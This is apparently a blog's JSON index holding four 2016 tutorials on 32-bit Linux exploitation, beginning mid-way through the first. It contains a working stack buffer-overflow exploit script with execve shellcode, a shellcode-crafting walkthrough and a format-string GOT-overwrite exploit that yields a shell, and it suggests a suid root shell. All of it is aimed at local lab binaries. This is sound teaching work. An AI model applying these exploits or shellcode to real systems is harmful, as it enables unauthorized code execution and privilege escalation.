\u0026#34;\\x90\u0026#34;*size def int2hexstr(num, intsize=4): if intsize == 8: if num \u0026lt; 0: result = struct.pack(\u0026#34;\u0026lt;q\u0026#34;, num) else: result = struct.pack(\u0026#34;\u0026lt;Q\u0026#34;, num) else: if num \u0026lt; 0: result = struct.pack(\u0026#34;\u0026lt;l\u0026#34;, num) else: result = struct.pack(\u0026#34;\u0026lt;L\u0026#34;, num) return result i2hs = int2hexstr def exploit(vuln): padding = pattern(0) payload = [padding] payload += [\u0026#34;PAYLOAD\u0026#34;] # put your payload here payload = list2hexstr(payload) args = [vuln, payload] env = {\u0026#34;PEDA\u0026#34;:nops()} resource.setrlimit(resource.RLIMIT_STACK, (-1, -1)) resource.setrlimit(resource.RLIMIT_CORE, (-1, -1)) os.execve(vuln, args, env) if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) \u0026lt; 2: usage() else: exploit(sys.argv[1]) We have to modify this to include our payload from the gdb session, the output looks like the following\n#!/usr/bin/env python # # Template for local argv exploit code, generated by PEDA # import os import sys import struct import resource import time def usage(): print \u0026#34;Usage: %starget_program\u0026#34; % sys.argv[0] return def pattern(size=1024, start=0): try: bytes = open(\u0026#34;pattern.txt\u0026#34;).read(size+start) return bytes[start:] except: return \u0026#34;A\u0026#34;*size def nops(size=1024): return \u0026#34;\\x90\u0026#34;*size def int2hexstr(num, intsize=4): if intsize == 8: if num \u0026lt; 0: result = struct.pack(\u0026#34;\u0026lt;q\u0026#34;, num) else: result = struct.pack(\u0026#34;\u0026lt;Q\u0026#34;, num) else: if num \u0026lt; 0: result = struct.pack(\u0026#34;\u0026lt;l\u0026#34;, num) else: result = struct.pack(\u0026#34;\u0026lt;L\u0026#34;, num) return result i2hs = int2hexstr def list2hexstr(intlist, intsize=4): result = \u0026#34;\u0026#34; for value in intlist: if isinstance(value, str): result += value else: result += int2hexstr(value, intsize) return result l2hs = list2hexstr def exploit(vuln): padding = \u0026#34;A\u0026#34; * 76 payload = [padding] shellcode = ( \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\u0026#34; \u0026#34;\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\u0026#34; ) payload += [int2hexstr(0xbffff46c) + nops(500) + shellcode] # put your payload here payload = list2hexstr(payload) args = [vuln, payload] env = {\u0026#34;PEDA\u0026#34;:nops()} resource.setrlimit(resource.RLIMIT_STACK, (-1, -1)) resource.setrlimit(resource.RLIMIT_CORE, (-1, -1)) os.execve(vuln, args, env) if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) \u0026lt; 2: usage() else: exploit(sys.argv[1]) Lets run it !!!!\n $ ./exploit.py ./vuln Illegal instruction (core dumped)  Why did this core dump? Well more likely that the address for our shellcode is now wrong because we were running in gdb before. Luckily it has core dumped and left a core file around so lets open this up in gdb\n $ gdb ./vuln ./core gedb-peda$ stack Warning: not running or target is remote 0000| 0xbffff820 (nop) 0004| 0xbffff824 (nop) 0008| 0xbffff828 (nop) 0012| 0xbffff82c (nop) 0016| 0xbffff830 (nop) 0020| 0xbffff834 (nop) 0024| 0xbffff838 (nop) 0028| 0xbffff83c (nop)  As you can see the address is different we adjust this script to point to 0xbffff83c instead (the parameter to int2hexstr) and lets see how that works out\n $ ./exploit.py ./vuln AAAAAAAAAAAA............. $  Nice!! we ended up with a shell (those running bash will have seen their prompt change\nLevel 1 complete! Next up what happens when we cant execute code from the stack!!!!\n","id":1,"section":"posts","summary":"What is Smashing the Stack You may have heard the term buffer overflow or smashing the stack but what does this mean? Simply this just means that a program hasnt checked its inputs and important data on the stack has been overwritten (such as a functions return address). Lets have a quick look at what a functions stack frame may look like\n3: Arguments 2: local buffer (64 chars) 1: Frame Pointer 0: Return Address  So if the program is vulnerable and doesnt do any bounds checking when writing data into the local buffer then that data can literally overflow the buffer overwriting the values that come after it (such as the return address).","tags":["32bit","linux","exploit","bufferoverflow"],"title":"Buffer overflows (Level 1)","uri":"/2016/11/buffer-overflow-level-1/","year":"2016"},{"content":" Intro Right! Let me start off by saying that this is not going to be and assembly code primer. This is just intended to a brief intro into the mindset needed to craft shellcode. There are blogs and resources more comprehensive than this post that explain things in greater detail, one such book is the Shellcoders Handbook.\nThis is just going to be a whrilwind tour, at the end of which you\u0026rsquo;ll have a highlevel view of the thought process that goes into crafting shellcode.\nSyscalls In linux (IA32) syscalls are generally called by placing the syscall number in the EAX register and then putting parameters in EBX, ECX and EDX with the return value being placed back in EAX. The kernel is then instructed to execute the call bu triggering the 0x80 interupt\nHow do we find these syscall numbers? Well these are listed in the include file unistd_32.h\nOn the vm I prepared (snag the vagrant file from the Vagrant post) they are in\n $ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | head -20 #ifndef _ASM_X86_UNISTD_32_H #define _ASM_X86_UNISTD_32_H /* * This file contains the system call numbers. */ #define __NR_restart_syscall 0 #define __NR_exit\t1 #define __NR_fork\t2 #define __NR_read\t3 #define __NR_write\t4 #define __NR_open\t5 #define __NR_close\t6 #define __NR_waitpid\t7 #define __NR_creat\t8 #define __NR_link\t9 #define __NR_unlink\t10 #define __NR_execve\t11 #define __NR_chdir\t12  We are going to write some shellcode which will call the execve syscall which is number 11.\nInformation Gathering We have our first piece of infomation, 11 is the number for the execve syscall. The next piece of info we need is what parameters does execve expect. To find this out we turn to the man pages.\n $ man execve NAME execve - execute program SYNOPSIS #include \u0026lt;unistd.h\u0026gt; int execve(const char *filename, char *const argv[], char *const envp[]);  As you can see it takes a string which is the file to execute (which is going to be /bin/sh in our example) then it takes an argument array and then an array containing the environment (which will be NULL for our purposes).\nTo recap our arguments are going to be * /bin/sh * [/bin/sh, 0x0] * 0x0 You may be thinking why the arguments array contains a reference to /bin/sh again? Well remember from your C days that argv[0] is the program name itself!.\nSo with that information in mind to think of this call in assembly below is how we want the registers to end up right before we call the int 0x80 to trigger the call * EAX: 11 (execve syscall) * EBX: Address of string /bin/sh * ECX: Address of Array containing [/bin/sh, 0x0] * EDX; Address pinting to a 0z0\nLimitations When generating shellcode we have a few restrictions. 1. We want the shellcode as small as possible, so we tend to reuse data already setup 2. We dont want any NULL bytes as they usually cause problems (as 0x0 terminsates strings etc)\nWith that in mind lets continue\nOn to the source First I would like to point out I\u0026rsquo;m using NASM here which uses intel style assembly.\nFirst we\u0026rsquo;ll get the string /bin/sh on the stack. Now it will take less instructions to get 8 bytes onto the stack than 7 (the current length of /bin/sh) so to get around this we\u0026rsquo;ll put the string //bin/sh on the stack (try this out linux doesnt care about the extra /)\nWe have to put the string on in reverse order so we start with the null terminator\nxor eax, eax ; zero out eax push eax ; push the 0x0 on the stack we now have the null terminator on the stack so now lets get the rest of the string. We\u0026rsquo;ll use python to get the hex value for this\n $ python -c 'print \u0026quot;//bin/sh\u0026quot;[::-1].encode(\u0026quot;hex\u0026quot;)' 68732f6e69622f2f  So we split this in half and then push it onto the stack\npush 0x68732f6e ; push the first half to the stack push 0x69622f2f ; push the second half of the stack mov ebx, esp ; move the address of the stack pointer to ebx (1st ; parameter to execve Now we can do two things next 1. Push the 0x0 onto the stack that we can use for the 3rd parameter (address of which will go into EDX) 2. We can use the address stored in EBX (the address //bin/sh string) as the value of ECX\nPoint 2 easy to see if you visualize the stack\nTop Bottom of Stack 0x00000000 //bin/sh 0x00000000 EDX EBX  So now if we point ECX to the address of the //bin/sh string we have our array\npush eax ; push 0x0 on the stack mov edx, esp ; move the address of 0x0 to the 3rd param push ebx ; push the address of //bin/sh on the stack mov ecx, esp ; move the address of the address of //bin/sh into ecx ; which is our secong parameter All that is left to do is to make the call\nmov al, 11 ; move 11 into EAX (execve call is number 11) int 0x80 ; trigger the call Above you will notice I use the al register which the the 8bit version of the EAX register, this is so there are no NULL bytes in the assembly as 32 bit version of 11 in hex is 0x0000000b and the 8 bit version is 0x0b.\nWith that all done here is the final assembly\nglobal _start section .text _start: xor eax, eax\t; zero out eax push eax ; push NULL onto stack to termins //bin/sh push 0x68732f6e ; push //bin/sh in reverse onto the stack ; (extra / is to make data multiple of 4) push 0x69622f2f ; see above mov ebx, esp ; move address of //bin/sh into EBX (execve\u0026#39;s 1st parameter) push eax ; this serves two purposes 1, to use for EDX (we will pass no ; environment to the shell and also as part of the array of ; args that we will pass to as the 2nd arg of execve mov edx, esp\t; see above push ebx ; ESP now points to and array of args [address of //bin/sh, 0x00] ; these will act as the args to //bin/sh mov ecx, esp\t; setup the 3rd argument mov al, 11 ; set the EAX register to the execve sys call number ; using al to remove any null bytes int 0x80 ; make the call To recap the few tricks we used 1. Used xor to create a NULL without having a null in the code 2. Added the extra / to the /bin/sh string to make pushing the data easier and with less instructions 3. Reused data we already had on the stack to create the arguments array for the execve call 4. Used the 8 bit version (al) of the EAX register to avoid NULL bytes in the generated code\nSave the above code to execve.nasm, compile, link and run\n $ nasm -f elf32 -o execve.o execve.nasm $ ld -o execve execve.o $ ./execve $  If you are running bash you will notice now that your prompt has changed, congrats your syscall worked!!\nConverting to shellcode So how do we go about converting this assembled object file into a shellcode string you see in exploits? There is a little tool called objdump which happens to have a -d flag and this flag dissasembles object files, lets see\n $ objdump -d execve.o execve.o: file format elf32-i386 Disassembly of section .text: 00000000 \u0026lt;_start\u0026gt;: 0:\t31 c0 xor %eax,%eax 2:\t50 push %eax 3:\t68 6e 2f 73 68 push $0x68732f6e 8:\t68 2f 2f 62 69 push $0x69622f2f d:\t89 e3 mov %esp,%ebx f:\t50 push %eax 10:\t89 e2 mov %esp,%edx 12:\t53 push %ebx 13:\t89 e1 mov %esp,%ecx 15:\tb0 0b mov $0xb,%al 17:\tcd 80 int $0x80  As you can see we from above we have our original assembly back (kind of). You see those hex bytes that appear before our assembly instructions? Those are the op codes that the CPU understands and those are what we need in our shellcode string.\nFirst we will need only the lines that contain instructions\n $ objdump -d execve.o | grep \u0026quot;^ \u0026quot; 0:\t31 c0 xor %eax,%eax 2:\t50 push %eax 3:\t68 6e 2f 73 68 push $0x68732f6e 8:\t68 2f 2f 62 69 push $0x69622f2f d:\t89 e3 mov %esp,%ebx f:\t50 push %eax 10:\t89 e2 mov %esp,%edx 12:\t53 push %ebx 13:\t89 e1 mov %esp,%ecx 15:\tb0 0b mov $0xb,%al 17:\tcd 80 int $0x80  Next we want just the second column or field\n $ objdump -d execve.o | grep \u0026quot;^ \u0026quot; | cut -f2 31 c0 50 68 6e 2f 73 68 68 2f 2f 62 69 89 e3 50 89 e2 53 89 e1 b0 0b cd 80  Then we want to iterate over each of these bytes and put the \\x in front of them. For loops to the rescue\n $ for i in $(objdump -d execve.o | grep \u0026quot;^ \u0026quot; | cut -f2); do echo '\\x'$i; done \\x31 \\xc0 \\x50 \\x68 \\x6e \\x2f \\x73 \\x68 \\x68 \\x2f \\x2f \\x62 \\x69 \\x89 \\xe3 \\x50 \\x89 \\xe2 \\x53 \\x89 \\xe1 \\xb0 \\x0b \\xcd \\x80  Nearly! Fortunately echo has a -n flag that prevents it from printing newlines\n $ for i in $(objdump -d execve.o | grep \u0026quot;^ \u0026quot; | cut -f2); do echo -n '\\x'$i; done \\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80$  So close!!!! We can just put an extra echo at the end\n $ for i in $(objdump -d execve.o | grep \u0026quot;^ \u0026quot; | cut -f2); do echo -n '\\x'$i; done; echo \\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80 $  Test the shellcode Now to test the shellcode we need a program we can put this in to run it. Below is a C program whic I did not create myself (Thanks Vivek from SecurityTube\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\u0026#34; \\ \u0026#34;\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\u0026#34; \\ \u0026#34;\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } This program just passes execution to our shellcode which we placed in the code string. Compile it using\n $ gcc -fno-stack-protector -z execstack -o shell_test shell_test.c $ ./shell_test Shellcode Length: 25 $  as you can see the program printed the length of the shellcode and then passed control of execution to our shellcode and we have now ended up with a shell!\nHope you enjoyed this. Check out SecurityTube they have free videos on x86 linux and windows assembly if you are interested in that sort of thing!\n","id":2,"section":"posts","summary":"Intro Right! Let me start off by saying that this is not going to be and assembly code primer. This is just intended to a brief intro into the mindset needed to craft shellcode. There are blogs and resources more comprehensive than this post that explain things in greater detail, one such book is the Shellcoders Handbook.\nThis is just going to be a whrilwind tour, at the end of which you\u0026rsquo;ll have a highlevel view of the thought process that goes into crafting shellcode.","tags":["linux","shellcode","assembly","32bit"],"title":"Crafting Shellcode","uri":"/2016/11/crafting-shellcode/","year":"2016"},{"content":" Background Any of us who have been around a while will most likely will have done some C and will almost certainly come across the printf family of functions. Now printf and its cousins have the special ability of accepting a string argument which details how the data passed to it should be formatted, for example\n#include \u0026lt;stdio.h\u0026gt; int main(int argc, char *argv[]) { if (argc == 2) { printf(\u0026#34;Received string: %s\u0026#34;, argv[1]); } } Save the file as hello.c and compile with\n $ gcc -o hello hello.c $ ./hello mike Received string: mike  Problem you can see that we received the output expected. However if the programmer was lazy (and most of us are) then because he was writing the string directly he may have just done something like the following\n#include \u0026lt;stdio.h\u0026gt; int main(int argc, char *argv[]) { if (argc == 2) { printf(argv[1]); } } Compile and run as before and you see the string still gets printed\n $ ./hello mike mike  but now the programmer has passed the data into printf where the format string is and printf will respond by parsing the input as a format string. The man page for printf shows us the format string specifiers that we can use in format strings, playaround with these and see what values you get back\n $ ./hello %d.%d -8856.-8832  Whoa! Where did those numbers came from? The answer is the stack our string said to display the next two params as decimal values, since we didnt provide them ourselves it pops them off the stack.\nExploiting This by its self can be used for data leakage by reading arbitrary data from the stack you could leak sensitive data stored in memory, read stack canary values to exploit buffer overflows in binaries where stack protection is enabled.\nToday however we are going to use this to get a shell\nSetup See my post on vagrant to setup a 32 bit virtual machine. Once ssh\u0026rsquo;d into that machine save the following file to fmt.c\n/* fmt.c - sample program vulnerable to format string exploitation * * $ gcc -o fmt fmt.c * $ execstack -s fmt # make stack executable */ #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char *argv[]) { char b[128]; strcpy(b, argv[1]); printf(b); printf(\u0026#34;\\n\u0026#34;); } Compile using\n $ gcc -fno-stack-protector -z execstack -o fmt fmt.c  You may see a warning about format strings but as long as you end up with a fmt binary its all good. You also need to disable ASLR or else your shellcode will move about on the stack each time you run the program. As root run\n $ echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space  Moving on Now we hav2 our vulnerable binary lets test it\n $ ./fmt AAAA AAAA  looks good, now after reading the man pages for printf we found a couple of interesting format specifiers * %x lets us display a value as hex * %n writes the amount of bytes written so far to the pointer that corresponds to this parameter\nJackpot! We can use this to write arbitrary data to a memory location that we control!!!! More on that later, first we need to find out how to access the data we supplied (so that we can provide our own address to write data to)\n $ ./fmt AAAA.%x.%x.%x.%x.%x.%x AAAA.bffff88b.1.b7ec71c9.41414141.2e78252e.252e7825  You can see from above that the 41414141 string is the 4th value on the stack (0x41 hex is 65 decimal which is ascii A). Now up until now I have not mention direct parameter access, this allows is to not have to specify all the %x\u0026rsquo;s and reference the 4th parameter as %4$x, see below\n $ ./fmt AAAA.%4\\$x AAAA.41414141  You can now see that we are fetching our 4 A\u0026rsquo;s of the stack (we have to escape the $ as it is a special shell character). With the help of the %n specifier we are going to write the address of some shellcode that we\u0026rsquo;ll place on the stack over the address of a function in the Global Offset Table (GOT for short) so to sum up those 4 A\u0026rsquo;s need to become the address of an entry in the GOT (and needs to be called after the printf function call) and we need to write enough data so that the %n value is equal to the address of our shell code.\nShellcode I am not going to explain how I crafted this shellcode (I\u0026rsquo;ll write another post on how I did that). Run the below command in order to set up an environment variable with our shell code in\n $ export EGG=$(python -c 'print \u0026quot;\\x90\u0026quot; * 64 + \u0026quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026quot;')  Here I\u0026rsquo;m using pythons ability to print hex chars to save the shellcode into the EGG environment variable (see shellstorm.org for more examples of shellcode)\nData Gathering Now in order to exploit this vulnerability we need to gather a few pieces of data\n Address of function in GOT to overwrite.\n$ objdump -R fmt fmt: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 08049ff0 R_386_GLOB_DAT __gmon_start__ 0804a000 R_386_JUMP_SLOT printf 0804a004 R_386_JUMP_SLOT strcpy 0804a008 R_386_JUMP_SLOT __gmon_start__ 0804a00c R_386_JUMP_SLOT __libc_start_main 0804a010 R_386_JUMP_SLOT putchar   we\u0026rsquo;ll use the address of putchar as this gets called immediately after the printf function so the address we are writing to is 0x0894a010 (this 32 bit / 4 byte address will become our A\u0026rsquo;s in the payload string this means our format string will become $(python -c \u0026lsquo;print \u0026ldquo;\\x10\\xa0\\x04\\x08\u0026rdquo;\u0026lsquo;).%4\\$n Which translated means write the number 5 to the address 0x0804a010. Why the number 5? Well we have written 4 bytes for the address (where the A\u0026rsquo;s used to be) plus 1 period we used as a spacer. You may be thinking wait why is the address backwards? Well this is because this machine is little endian (go and google!!). Lets verify this in gdb!!\n $ gdb fmt gdb-peda$ run $(python -c 'print \u0026quot;\\x10\\xa0\\x04\\x08\u0026quot;').%4\\$n [----------------------------------registers-----------------------------------] EAX: 0x5 EBX: 0xb7fd1ff4 --\u0026gt; 0x1a0d7c ECX: 0x0 EDX: 0x0 ESI: 0x0 EDI: 0x0 EBP: 0xbffff698 --\u0026gt; 0x0 ESP: 0xbffff5fc --\u0026gt; 0x8048480 (\u0026lt;main+60\u0026gt;: leave) EIP: 0x5 EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x5 [------------------------------------stack-------------------------------------] 0000| 0xbffff5fc --\u0026gt; 0x8048480 (\u0026lt;main+60\u0026gt;: leave) 0004| 0xbffff600 --\u0026gt; 0xa ('\\n') 0008| 0xbffff604 --\u0026gt; 0xbffff88a --\u0026gt; 0x804a010 --\u0026gt; 0x5 0012| 0xbffff608 --\u0026gt; 0x1 0016| 0xbffff60c --\u0026gt; 0xb7ec71c9 (test eax,eax) 0020| 0xbffff610 --\u0026gt; 0x804a010 --\u0026gt; 0x5 0024| 0xbffff614 (\u0026quot;.%4$n\u0026quot;) 0028| 0xbffff618 --\u0026gt; 0x6e ('n') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x00000005 in ?? () gdb-peda$ x/xw 0x0804a010 0x804a010 \u0026lt;putchar@got.plt\u0026gt;:\t0x00000005 gdb-peda$  As you can see from above the program crashed and we have verified that the value 5 has indeed been written to the address we wanted,\n We now need to know the address of our shellcode, this address can be anywhere in our NOP sled (the bunch of 0x90\u0026rsquo;s we put at the beginning of our shellcode EGG environment variable)\ngdb-peda$ find 0x90909090 $esp $esp+2000 Searching for '0x90909090' in range: 0xbffff5ac - 0xbffffd7c Found 16 results, display max 16 items: [stack] : 0xbffff8d8 --\u0026gt; 0x90909090 [stack] : 0xbffff8dc --\u0026gt; 0x90909090 [stack] : 0xbffff8e0 --\u0026gt; 0x90909090 [stack] : 0xbffff8e4 --\u0026gt; 0x90909090 [stack] : 0xbffff8e8 --\u0026gt; 0x90909090 [stack] : 0xbffff8ec --\u0026gt; 0x90909090 [stack] : 0xbffff8f0 --\u0026gt; 0x90909090 [stack] : 0xbffff8f4 --\u0026gt; 0x90909090 [stack] : 0xbffff8f8 --\u0026gt; 0x90909090 [stack] : 0xbffff8fc --\u0026gt; 0x90909090 [stack] : 0xbffff900 --\u0026gt; 0x90909090 [stack] : 0xbffff904 --\u0026gt; 0x90909090 [stack] : 0xbffff908 --\u0026gt; 0x90909090 [stack] : 0xbffff90c --\u0026gt; 0x90909090 [stack] : 0xbffff910 --\u0026gt; 0x90909090 [stack] : 0xbffff914 --\u0026gt; 0x90909090 gdb-peda$ x/20i 0xbffff910 0xbffff910:\tnop 0xbffff911:\tnop 0xbffff912:\tnop 0xbffff913:\tnop 0xbffff914:\tnop 0xbffff915:\tnop 0xbffff916:\tnop 0xbffff917:\tnop 0xbffff918:\txor eax,eax 0xbffff91a:\tpush eax 0xbffff91b:\tpush 0x68732f2f 0xbffff920:\tpush 0x6e69622f 0xbffff925:\tmov ebx,esp 0xbffff927:\tpush eax 0xbffff928:\tpush ebx 0xbffff929:\tmov ecx,esp 0xbffff92b:\tmov al,0xb 0xbffff92d:\tint 0x80 0xbffff92f:\tadd BYTE PTR [ebp+0x53],dl 0xbffff932:\tinc ebp gdb-peda$   Above we first used the find command to find 4 consecutive NOP\u0026rsquo;s on the stack (0x90\u0026rsquo;s) and we found a list of possible addresses, we then chose an address near to the bottom of the list and examined 20 instructions (x/20i) from that address. This looks like the assembly for an execve syscall (the 0xb going in the eax/al register and the int 0x80) so we found our address 0xbffff910.\nWe now have all the information we need to exploit this, to recap * We are going to overwrite the putchar address 0x0804a010 * We are going to overwrite it with the address of our shell code where is 0xbffff910\nCrafting the exploit Armed with our information we are now going to tackle the writing the address of our shellcode in two parts\n Write the lower order bytes. From our shellcode address this means we first want to write the value f910 which in decimal is 63760 now we have to take into account that we have already written 5 bytes and we want to use one byte as a spacer so this leaves us with 63754 bytes and our format string becomes\ngdb-peda$ run $(python -c 'print \u0026quot;\\x10\\xa0\\x04\\x08\u0026quot;').%63754u.%4\\$n [----------------------------------registers-----------------------------------] EAX: 0xf910 EBX: 0xb7fd1ff4 --\u0026gt; 0x1a0d7c ECX: 0x0 EDX: 0x0 ESI: 0x0 EDI: 0x0 EBP: 0xbffff638 --\u0026gt; 0x0 ESP: 0xbffff59c --\u0026gt; 0x8048480 (\u0026lt;main+60\u0026gt;:\tleave) EIP: 0xf910 EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0xf910 [------------------------------------stack-------------------------------------] 0000| 0xbffff59c --\u0026gt; 0x8048480 (\u0026lt;main+60\u0026gt;:\tleave) 0004| 0xbffff5a0 --\u0026gt; 0xa ('\\n') 0008| 0xbffff5a4 --\u0026gt; 0xbffff826 --\u0026gt; 0x804a010 --\u0026gt; 0xf910 0012| 0xbffff5a8 --\u0026gt; 0x1 0016| 0xbffff5ac --\u0026gt; 0xb7ec71c9 (test eax,eax) 0020| 0xbffff5b0 --\u0026gt; 0x804a010 --\u0026gt; 0xf910 0024| 0xbffff5b4 (\u0026quot;.%63754u.%4$n\u0026quot;) 0028| 0xbffff5b8 (\u0026quot;754u.%4$n\u0026quot;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000f910 in ?? () gdb-peda$ x/xw 0x0804a010 0x804a010 \u0026lt;putchar@got.plt\u0026gt;:\t0x0000f910 gdb-peda$   As you can see we have written the lower order bytes to the address correctly\n We now need to tackle the higher order bytes, so now that means we need to write bfff - F910 more bytes to the higher order bytes. But this sum works out to a negative figure to fix this we use a trick we do 1bfff - f910 which equals c6ef or 50927 in decimal. We also have to adjust the address we are writing too by 2 bytes (as we are writing to the higher order bytes. Our input string now becomes\ngdb-peda$ run $(python -c 'print \u0026quot;\\x10\\xa0\\x04\\x08\u0026quot; + \u0026quot;\\x12\\xa0\\x04\\x08\u0026quot;').%63750u.%4\\$n.%50925u.%5\\$n $ ps [New process 8218] process 8218 is executing new program: /bin/ps PID TTY TIME CMD 7883 pts/0 00:00:00 bash 8211 pts/0 00:00:00 gdb 8213 pts/0 00:00:00 sh 8218 pts/0 00:00:00 ps   and we have a shell!! So what happened to our format string, well\u0026hellip;.. 1. We wrote 4 more bytes for the address of the higher order bytes so the %63754u part had to become %63750u 2. we added ,%50925u.%5\\$n to the format string the 50925 part is the 50927 bytes we calculated that we needed to write minus the 2 extra bytes we used for the spacers and now we have to write this value to the 5th parameter on the stack which is the address of the higher order bytes of the putchar address (0x0804a010), we don\u0026rsquo;t need to inspect this address this time as we have a shell\nLets just attempt this exploit outside of gdb\n $ ./fmt $(python -c 'print \u0026quot;\\x10\\xa0\\x04\\x08\u0026quot; + \u0026quot;\\x12\\xa0\\x04\\x08\u0026quot;').%63750u.%4\\$n.%50925u.%5\\$n $ ps PID TTY TIME CMD 7883 pts/0 00:00:00 bash 8211 pts/0 00:00:00 gdb 8213 pts/0 00:00:00 sh 8233 pts/0 00:00:00 sh 8234 pts/0 00:00:00 ps  voila! We have a shell, now we could perhaps to further verify this if you set the owner of the fmt bin to root (chown root:root) and set the suid bit (chmod +s fmt) then you will be able to exploit this an get a root shell\nEnjoy!!!\n","id":3,"section":"posts","summary":"Background Any of us who have been around a while will most likely will have done some C and will almost certainly come across the printf family of functions. Now printf and its cousins have the special ability of accepting a string argument which details how the data passed to it should be formatted, for example\n#include \u0026lt;stdio.h\u0026gt; int main(int argc, char *argv[]) { if (argc == 2) { printf(\u0026#34;Received string: %s\u0026#34;, argv[1]); } } Save the file as hello.","tags":["linux","exploit","32bit"],"title":"Format Strings","uri":"/2016/11/format-strings/","year":"2016"},{"content":" Why When I started to learn about buffer overflows and memory exploits etc I found that lots of the tutorials and material left out the details of environment specifics. Therefore when I came to follow through the tutorials I ended up with radically different results, got confused and felt like giving up.\nVirtualisation FTW These days it is easy to run virtual machines and Oracle\u0026rsquo;s virtualbox is free to use and is stable enough to not have caused me too many issues.\nSee here to download and view install instructions for your platform\nVagrant What you quickly learn is that virtual machines take up a lot of space and become a pain in the butt to manage the configs etc. In step vagrant to save the day.\nVagrant allows you to specify the box config \u0026amp; software setup all within a ruby file (Named Vagrantfile) and run a couple of commands and you can then ssh into your new environment.\nTo initialize a new machine cd into a directory where you will be working and issue\n $ vagrant init  The above command generates a Vagantfile in the current directory. You edit the config.vm.box to be a base box you desire (read docs for more info) which you can find here. You then run\n $ vagrant up  which will then download the base box, create you an instance of it and allow you to ssh into it using the command\n $ vagrant ssh  Now you can do much, much more but one of the interesting feature is the ability to automatically run provisioning scripts.\nBelow is the Vagrantfile I use for learning memory exploits, it uses ubuntu precise 32bit for its base and I install git, pip, peda (gdb plugin) and gdb to help with debugging. Vagrant also mounts the current directory at /vagrant on the guest so you can share your code with the guest OS.\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;hashicorp/precise32\u0026#34; config.vm.provider \u0026#34;virtualbox\u0026#34; do |vb| vb.memory = \u0026#34;1024\u0026#34; end config.vm.provision \u0026#34;shell\u0026#34;, inline: \u0026lt;\u0026lt;-SHELL  apt-get update apt-get install -y git apt-get install -y gdb apt-get install -y python-pip apt-get install -y build-essential git clone https://github.com/longld/peda.git /home/vagrant/peda chown -R vagrant:vagrant /home/vagrant/peda echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; /home/vagrant/.gdbinit chown vagrant:vagrant /home/vagrant/.gdbinit pip install ropgadget SHELL end As you can see this is just a matter of running the relevant shell commands to install the required software\nCouple this with github and you can have numerous configurations of machines at your fingertips and only download the box files etc when you need them. Vargrant allows you to have a consistent environment throughout all your development / research.\nOnce your down with the machine just run\n $ vagrant halt $ vagrant destroy  remember destroy really does delete the VM so remember to do all the work you want to keep in /vagrant or remember to copy it off of the vm in someway (iethub etc) before you do this.\n","id":4,"section":"posts","summary":"Why When I started to learn about buffer overflows and memory exploits etc I found that lots of the tutorials and material left out the details of environment specifics. Therefore when I came to follow through the tutorials I ended up with radically different results, got confused and felt like giving up.\nVirtualisation FTW These days it is easy to run virtual machines and Oracle\u0026rsquo;s virtualbox is free to use and is stable enough to not have caused me too many issues.","tags":["tools"],"title":"Using Vagrant","uri":"/2016/10/using-vagrant/","year":"2016"}],"tags":[{"title":"32bit","uri":"/tags/32bit/"},{"title":"assembly","uri":"/tags/assembly/"},{"title":"bufferoverflow","uri":"/tags/bufferoverflow/"},{"title":"exploit","uri":"/tags/exploit/"},{"title":"linux","uri":"/tags/linux/"},{"title":"shellcode","uri":"/tags/shellcode/"},{"title":"slae","uri":"/tags/slae/"},{"title":"tools","uri":"/tags/tools/"}]}